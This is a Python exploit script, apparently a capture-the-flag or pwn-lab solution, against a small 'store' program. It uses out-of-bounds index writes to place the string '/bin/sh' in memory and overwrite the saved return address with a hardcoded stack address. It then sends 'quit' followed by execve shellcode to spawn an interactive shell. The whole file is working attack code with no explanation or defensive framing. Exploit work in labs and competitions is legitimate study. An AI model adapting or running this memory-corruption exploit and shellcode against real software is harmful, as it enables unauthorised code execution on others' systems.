import interact

p = interact.Process()

# Helper function
def store_idx(index, number):
    p.readuntil('command: ')
    p.sendline('store')
    p.readuntil('Number: ')
    p.sendline(str(number))
    p.readuntil('Index: ')
    p.sendline(str(index))

# ==========================================
# 1. Store the string "/bin/sh\x00" safely in data
# ==========================================
print("[*] Storing /bin/sh string...")
# "/bin" = 0x6e69622f
store_idx(98, 1852400175) 

# "/sh\x00" = 0x0068732f
store_idx(99, 6845231)    

# ==========================================
# 2. Overwrite RIP to jump to cmd+4 
# ==========================================
# cmd is at 0x7fffffffedb0. cmd+4 is 0x7fffffffedb4
print("[*] Overwriting RIP to 0x7fffffffedb4...")

store_idx(110, 4294962612) # Lower half: 0xffffedb4
store_idx(111, 32767)      # Upper half: 0x00007fff

# ==========================================
# 3. quit + shellcode trap
# ==========================================
print("[*] Triggering exploit...")

# lea rdi, [rdi-8] | xor esi, esi | xor edx, edx | push 0x3b | pop rax | syscall
shellcode = b"\x48\x8d\x7f\xf8\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05"

p.readuntil('command: ')
p.sendline(b"quit" + shellcode)

p.interactive()